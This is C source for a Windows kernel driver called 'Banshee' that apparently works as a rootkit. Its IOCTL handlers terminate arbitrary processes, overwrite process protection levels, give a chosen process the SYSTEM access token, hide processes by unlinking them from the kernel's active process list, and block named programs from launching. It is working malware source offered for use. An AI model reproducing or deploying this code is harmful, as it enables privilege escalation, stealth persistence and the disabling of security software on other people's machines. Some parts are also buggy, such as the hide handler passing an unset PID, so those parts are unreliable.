#include <ntifs.h>
#include <wdf.h>
#include <ntstrsafe.h>

// Bshe
#define DRIVER_TAG 'ehsB'

// Device names
UNICODE_STRING usDriverName = RTL_CONSTANT_STRING(L"\\Device\\Banshee");
UNICODE_STRING usDosDeviceName = RTL_CONSTANT_STRING(L"\\DosDevices\\Banshee");

// --------------------------------------------------------------------------------------------------------
// IOCTLs 

#define BE_IOCTL_TEST_DRIVER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_KILL_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_PROTECT_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _IOCTL_PROTECT_PROCESS_PAYLOAD {
    ULONG pid;
    BYTE newProtectionLevel;
} IOCTL_PROTECT_PROCESS_PAYLOAD;

#define BE_IOCTL_BURY_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _GLOBALS_BURYPROCESS {
    BOOLEAN buryRoutineAdded;
    WCHAR* beBuryTargetProcessName;
} GLOBALS_BURYPROCESS;

GLOBALS_BURYPROCESS globals_buryProcess = {
    FALSE,
    NULL
};

#define BE_IOCTL_ELEVATE_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)

// --------------------------------------------------------------------------------------------------------

// Windows versions
#define WIN_1507 10240
#define WIN_1511 10586
#define WIN_1607 14393
#define WIN_1703 15063
#define WIN_1709 16299
#define WIN_1803 17134
#define WIN_1809 17763
#define WIN_1903 18362
#define WIN_1909 18363
#define WIN_2004 19041
#define WIN_20H2 19042
#define WIN_21H1 19043
#define WIN_21H2 19044
#define WIN_22H2 19045
#define WIN_1121H2 22000
#define WIN_1122H2 22621

// Protection Levels - Windows Internals Part 1 - Page 115 (7th english edition)
BYTE PS_PROTECTED_SYSTEM = 0x72; // Geschützt WinSystem
BYTE PS_PROTECTED_WULONGCB = 0x62; // Geschützt WinTcb
BYTE PS_PROTECTED_WULONGCB_LIGHT = 0x61; // PPL WinTcb
BYTE PS_PROTECTED_WINDOWS = 0x52; // Geschützt Windows
BYTE PS_PROTECTED_WINDOWS_LIGHT = 0x51; // PPL Windows
BYTE PS_PROTECTED_LSA_LIGHT = 0x41; // PPL Lsa
BYTE PS_PROTECTED_ANTIMALWARE_LIGHT = 0x31; // PPL Anti - malware
BYTE PS_PROTECTED_AUTHENTICODE = 0x21; // Geschützt Authenticode
BYTE PS_PROTECTED_AUTHENTICODE_LIGHT = 0x11; // PPL Authenticode
BYTE PS_PROTECTED_NONE = 0x00; // Keine Keine

// --------------------------------------------------------------------------------------------------------

/**
 * Check whether a wstring is null-terminated
 * 
 * @return BOOLEAN True if null-terminated.
 */
BOOLEAN 
BeIsStringTerminated(PWCHAR Array, ULONG ArrayLength)
{
    BOOLEAN bStringIsTerminated = FALSE;
    USHORT uiIndex = 0;

    while (uiIndex < ArrayLength && bStringIsTerminated == FALSE)
    {
        if (Array[uiIndex] == L'\0')
        {
            bStringIsTerminated = TRUE;
        }
        else
        {
            uiIndex++;
        }
    }
    return bStringIsTerminated;
}

/**
 * Get offset to the access token from the EPROCESS structure, depending on the OS version.
 * Taken from https://github.com/Idov31/Nidhogg/blob/2776908e86c34771d0663e931b1930c64a9d4b15/Nidhogg/WindowsTypes.hpp
 *
 * @return ULONG Offset to Acess Token.
 */
ULONG 
BeGetAccessTokenOffset()
{
    RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
    RtlGetVersion(&osVersion);

    DbgPrint("Running on %i", osVersion.dwBuildNumber);

    ULONG tokenOffset = 0;

    switch (osVersion.dwBuildNumber)
    {
    case WIN_1903:
    case WIN_1909:
        tokenOffset = 0x360;
        break;
    case WIN_1507:
    case WIN_1511:
    case WIN_1607:
    case WIN_1703:
    case WIN_1709:
    case WIN_1803:
    case WIN_1809:
        tokenOffset = 0x358;
        break;
    default:
        tokenOffset = 0x4b8;
        break;
    }

    DbgPrint("Token offset: %i", tokenOffset);
    return tokenOffset;
}

/**
 * Get offset to the process list from the EPROCESS structure, depending on the OS version.
 * Taken from https://github.com/Idov31/Nidhogg/blob/2776908e86c34771d0663e931b1930c64a9d4b15/Nidhogg/WindowsTypes.hpp
 *
 * @return ULONG Offset to Process List.
 */
ULONG 
BeGetProcessLinkedListOffset()
{
    RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
    RtlGetVersion(&osVersion);

    DbgPrint("Running on %i", osVersion.dwBuildNumber);

    ULONG activeProcessLinks = 0;

    switch (osVersion.dwBuildNumber) 
    {
    case WIN_1507:
    case WIN_1511:
    case WIN_1607:
    case WIN_1903:
    case WIN_1909:
        activeProcessLinks = 0x2f0;
        break;
    case WIN_1703:
    case WIN_1709:
    case WIN_1803:
    case WIN_1809:
        activeProcessLinks = 0x2e8;
        break;
    default:
        activeProcessLinks = 0x448;
        break;
    }

    return activeProcessLinks;
}

/**
 * "Burying" functionality - this is callback on process creation that blocks the specified process from being recreated.
 *
 * @param Process A pointer to the EPROCESS structure for the process.
 * @param ProcessId The process ID of the process.
 * @param CreateInfo If this parameter is non-NULL, a new process is being created, and CreateInfo points to a PS_CREATE_NOTIFY_INFO structure that describes the new process. If this parameter is NULL, the specified process is exiting.
 */
VOID 
BeBury_ProcessNotifyRoutineEx(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
{
    UNREFERENCED_PARAMETER(Process);

    if (CreateInfo) // If new process is created ...
    {
        // ... and its the one we want to bury ...
        DbgPrint("Process Creation %i: %wZ\n", (ULONG)ProcessId, CreateInfo->ImageFileName);

        if (globals_buryProcess.beBuryTargetProcessName != NULL && *globals_buryProcess.beBuryTargetProcessName != '\0')
        {
            if (wcsstr(
                CreateInfo->ImageFileName->Buffer,
                globals_buryProcess.beBuryTargetProcessName
            ) != NULL) // check for substr
            {
                DbgPrint("Blocking buried process from starting.");
                // ... then block it by setting the creation status to denied
                CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
                return;
            }
        }
    }
}

/**
 * Called on closing the driver.
 *
 * @param DeviceObject Pointer to the DeviceObject.
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeUnSupportedFunction(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(pDeviceObject);
    UNREFERENCED_PARAMETER(Irp);
    DbgPrint("Unsupported function Called \r\n");
    return STATUS_SUCCESS;
}

/**
 * Kills a process by PID.
 *
 * @param pid PID of the process to kill
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeKillProcess(HANDLE pid)
{
    HANDLE hProcess = NULL;

    CLIENT_ID ci;
    ci.UniqueProcess = pid;
    ci.UniqueThread = 0;

    OBJECT_ATTRIBUTES obj;
    obj.Length = sizeof(obj);
    obj.Attributes = 0;
    obj.ObjectName = 0;
    obj.RootDirectory = 0;
    obj.SecurityDescriptor = 0;
    obj.SecurityQualityOfService = 0;

    ZwOpenProcess(&hProcess, 1, &obj, &ci);
    NTSTATUS NtStatus = ZwTerminateProcess(hProcess, 0);
    ZwClose(hProcess);

    DbgPrint("KillProcess %i \r\n", NtStatus);
    return NtStatus;
}

/**
 * Called on unloading the driver.
 *
 * @param DriverObject Pointer to the DriverObject.
 * @return NTSTATUS status code.
 */
NTSTATUS
BeUnload(PDRIVER_OBJECT DriverObject)
{
    DbgPrint("Unload Called \r\n");

    // Remove our bury routine if we set one
    if (globals_buryProcess.buryRoutineAdded)
    {
        if (PsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, TRUE) == STATUS_SUCCESS)
        {
            DbgPrint("Removed routine!\n");
        }
        else
        {
            DbgPrint("Failed to remove routine!\n");
        }
        // free global memory for wstr
        ExFreePool2(globals_buryProcess.beBuryTargetProcessName, DRIVER_TAG, NULL, 0);
    }

    IoDeleteSymbolicLink(&usDosDeviceName);
    IoDeleteDevice(DriverObject->DeviceObject);
    return STATUS_SUCCESS;
}

/**
 * Called on closing the driver.
 *
 * @param DeviceObject Pointer to the DeviceObject.
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeClose(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(pDeviceObject);
    UNREFERENCED_PARAMETER(Irp);
    DbgPrint("Close Called \r\n");
    return STATUS_SUCCESS;
}

/**
 * Called on driver creation.
 *
 * @param DeviceObject Pointer to the DeviceObject.
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeCreate(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(pDeviceObject);
    UNREFERENCED_PARAMETER(Irp);
    DbgPrint("Create Called \r\n");
    return STATUS_SUCCESS;
}

/**
 * IOCTL Method for testing the driver by writing an int value of 6 into the outBuffer.
 *
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @param pIoStackIrp Pointer to the caller's I/O stack location in the specified IRP.
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoctlTestDriver(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten)
{
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PCHAR pInputBuffer = Irp->AssociatedIrp.SystemBuffer;
    PCHAR pOutputBuffer = Irp->AssociatedIrp.SystemBuffer;

    ULONG dwDataOut = 6; // Write a 6 for testing
    ULONG dwDataSize = sizeof(ULONG);

    if (pInputBuffer && pOutputBuffer)
    {
        if (pIoStackIrp->Parameters.DeviceIoControl.OutputBufferLength >= dwDataSize) // Output buffer should be big enough
        {
            RtlCopyMemory(pOutputBuffer, &dwDataOut, dwDataSize);
            *pdwDataWritten = dwDataSize;
            NtStatus = STATUS_SUCCESS;
        }
        else
        {
            *pdwDataWritten = dwDataSize;
            NtStatus = STATUS_BUFFER_TOO_SMALL;
        }
    }

    return NtStatus;
}

/**
 * IOCTL Method for killing an arbitrary process by PID.
 *
 * @param pid PID of the target process
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeIoctlKillProcess(HANDLE pid)
{
    PEPROCESS process;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    DbgPrint("KillProcess Called \r\n");

    // Lookup process
    NtStatus = PsLookupProcessByProcessId(pid, &process);
    if (NtStatus != 0)
    {
        DbgPrint("PID %i not found", (ULONG)pid);
        return NtStatus;
    }

    DbgPrint("Killing %i", (ULONG)pid);
    NtStatus = BeKillProcess(pid);
    return NtStatus;
}

/**
 * IOCTL Method for setting the protection of an arbitrary process by PID.
 *
 * @param payload Payload struct containing the PID and the target protection level
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeIoctlProtectProcess(IOCTL_PROTECT_PROCESS_PAYLOAD payload)
{
    PEPROCESS process = NULL;
    HANDLE pid = (HANDLE)payload.pid;
    BYTE newProtectionLevel = payload.newProtectionLevel;
    DbgPrint("Changing pid %i protection to %i", (ULONG)pid, newProtectionLevel);

    // Lookup process
    NTSTATUS NtStatus = PsLookupProcessByProcessId(pid, &process);
    if (NtStatus != 0)
    {
        DbgPrint("PID %i not found", (ULONG)pid);
        return NtStatus;
    }

    // Protection level is in EPROCESS structure at offset 0x87a, at least on my win10 install..
    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + 0x87a;

    DbgPrint("Current protection level: %i", *((BYTE*)(EProtectionLevel)));

    // assign new protection level
    *((BYTE*)(EProtectionLevel)) = newProtectionLevel;

    DbgPrint("New protection level: %i", *((BYTE*)(EProtectionLevel)));

    NtStatus = STATUS_SUCCESS;
    return NtStatus;
}

/**
 * Activates the callback to enable the "burying" functionality.
 *
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeIoctlBuryProcess(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten)
{
    UNREFERENCED_PARAMETER(pdwDataWritten);
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    WCHAR* pInputBuffer = Irp->AssociatedIrp.SystemBuffer;
    ULONG dwSize = pIoStackIrp->Parameters.DeviceIoControl.InputBufferLength;

    DbgPrint("BeIoctlBuryProcess called, size: %i", dwSize);
    __try
    {
        // Check alignment
        if (dwSize % sizeof(WCHAR) != 0)
        {
            DbgPrint("Invalid alignment");
            return STATUS_INVALID_BUFFER_SIZE;
        }

        if (!pInputBuffer)
        {
            DbgPrint("Empty buffer");
            return STATUS_INVALID_PARAMETER;
        }

        DbgPrint("String received: %ws", pInputBuffer);

        if (BeIsStringTerminated(pInputBuffer, dwSize) == FALSE)
        {
            DbgPrint("Not null terminated!");
            return STATUS_UNSUCCESSFUL;
        }

        if (globals_buryProcess.buryRoutineAdded)
        {
            DbgPrint("Routine already exists!\n");
            return STATUS_SUCCESS;
        }

        // Allocate global memory for process name and copy over to global
        globals_buryProcess.beBuryTargetProcessName = (WCHAR*)ExAllocatePool2(POOL_FLAG_PAGED, dwSize, DRIVER_TAG);
        if (!globals_buryProcess.beBuryTargetProcessName)
        {
            return STATUS_MEMORY_NOT_ALLOCATED;
        }
        RtlCopyMemory(globals_buryProcess.beBuryTargetProcessName, pInputBuffer, dwSize);

        DbgPrint("String now: %ws", globals_buryProcess.beBuryTargetProcessName);

        NtStatus = PsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, FALSE);
        globals_buryProcess.buryRoutineAdded = TRUE;

        if (NtStatus == STATUS_SUCCESS)
        {
            DbgPrint("Added routine!\n");
        }
        else
        {
            DbgPrint("Failed to add routine! Error: %i\n", NtStatus);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) 
    {
        NtStatus = GetExceptionCode();
    }

    return NtStatus;
}

/**
 * Sets target process access token to a SYSTEM token.
 *
 * @param pid PID of target process.
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeIoCtlElevateProcessAcessToken(HANDLE pid)
{
    PEPROCESS privilegedProcess, targetProcess;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    ULONG tokenOffset = BeGetAccessTokenOffset();

    // Lookup target process
    NtStatus = PsLookupProcessByProcessId(pid, &targetProcess);
    if (NtStatus != 0)
    {
        DbgPrint("PID %i not found", (ULONG)pid);
        return NtStatus;
    }

    // Lookup system process (handle for pid 4)
    NtStatus = PsLookupProcessByProcessId((HANDLE)4, &privilegedProcess);
    if (NtStatus != 0)
    {
        DbgPrint("System process not found with pid 4");
        return NtStatus;
    }

    //DbgPrint("Token Target: %i", (ULONG)targetProcess + tokenOffset);
    //DbgPrint("Token System: %i", (ULONG)privilegedProcess + tokenOffset);

    // Replace target process token with system token
    *(ULONG64*)((ULONG64)targetProcess + tokenOffset) = *(ULONG64*)((ULONG64)privilegedProcess + tokenOffset);

    return NtStatus;
}

/**
 * Hides a process by removing it from the linked list of active processes referenced in EPROCESS.
 *
 * @param pid PID of target process.
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeIoctlHideProcess(HANDLE pid)
{
    PEPROCESS targetProcess = NULL;
    NTSTATUS NtStatus = PsLookupProcessByProcessId(pid, &targetProcess);
    PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + BeGetProcessLinkedListOffset());
    RemoveEntryList(processListEntry);
    return NtStatus;
}

/**
 * Essentially Banshee's IOCTL dispatcher. Takes care of incoming IO Request Packets (IRPs),
 * parses the payload and calls the appropriate function.
 * 
 * @param DeviceObject Pointer to the DeviceObject.
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeIoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    DbgPrint("BeIoControl Called \r\n");

    NTSTATUS status = STATUS_NOT_SUPPORTED;
    PIO_STACK_LOCATION pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);;
    ULONG dwDataWritten = 0;

    ULONG targetPid = 0;
    IOCTL_PROTECT_PROCESS_PAYLOAD payload = { 0 };

    if (pIoStackIrp)
    {
        switch (pIoStackIrp->Parameters.DeviceIoControl.IoControlCode)
        {
        case BE_IOCTL_TEST_DRIVER:
            status = BeIoctlTestDriver(Irp, pIoStackIrp, &dwDataWritten);
            break;

        case BE_IOCTL_KILL_PROCESS:
            RtlCopyMemory(&targetPid, Irp->AssociatedIrp.SystemBuffer, sizeof(ULONG)); // Copy over PID parameter from IRP buffer
            status = BeIoctlKillProcess(ULongToHandle(targetPid));
            break;

        case BE_IOCTL_ELEVATE_TOKEN:
            RtlCopyMemory(&targetPid, Irp->AssociatedIrp.SystemBuffer, sizeof(ULONG)); // Copy over PID parameter from IRP buffer
            status = BeIoCtlElevateProcessAcessToken(ULongToHandle(targetPid));
            break;

        case BE_IOCTL_PROTECT_PROCESS:
            RtlCopyMemory(&payload, Irp->AssociatedIrp.SystemBuffer, sizeof(IOCTL_PROTECT_PROCESS_PAYLOAD)); // Copy over payload from IRP buffer
            status = BeIoctlProtectProcess(payload);
            break;

        case BE_IOCTL_BURY_PROCESS: 
            status = BeIoctlBuryProcess(Irp, pIoStackIrp, &dwDataWritten);
            break;
        
        case BE_IOCTL_HIDE_PROCESS:
            RtlCopyMemory(&payload, Irp->AssociatedIrp.SystemBuffer, sizeof(IOCTL_PROTECT_PROCESS_PAYLOAD)); // Copy over PID parameter from IRP buffer
            status = BeIoctlHideProcess(ULongToHandle(targetPid));
            break;
        }
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = dwDataWritten;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

/**
 * Driver entrypoint (think main()).
 *
 * @param pDriverObject Pointer to the DriverObject.
 * @param pRegistryPath A pointer to a UNICODE_STRING structure that specifies the path to the driver's Parameters key in the registry.
 * @return NTSTATUS status code.
 */
NTSTATUS
DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
    UNREFERENCED_PARAMETER(pRegistryPath);
    DbgPrint("DriverEntry Called \r\n");

    NTSTATUS NtStatus = STATUS_SUCCESS;
    ULONG uiIndex = 0;
    PDEVICE_OBJECT pDeviceObject = NULL;

    NtStatus = IoCreateDevice(
        pDriverObject,
        0,
        &usDriverName,
        FILE_DEVICE_UNKNOWN, // not associated with any real device
        FILE_DEVICE_SECURE_OPEN,
        FALSE, 
        &pDeviceObject
    );

    pDriverObject->DriverUnload = BeUnload;

    // IRP Major Requests
    for (uiIndex = 0; uiIndex < IRP_MJ_MAXIMUM_FUNCTION; uiIndex++)
    {
        pDriverObject->MajorFunction[uiIndex] = (PDRIVER_DISPATCH)BeUnSupportedFunction;
    }
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = (PDRIVER_DISPATCH)BeClose;               // CloseHandle
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = (PDRIVER_DISPATCH)BeCreate;             // CreateFile
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)BeIoControl;  // DeviceIoControl

    NtStatus = IoCreateSymbolicLink(&usDosDeviceName, &usDriverName); // Symbolic Link simply maps a DOS Device Name to an NT Device Name.

    return NtStatus;
}
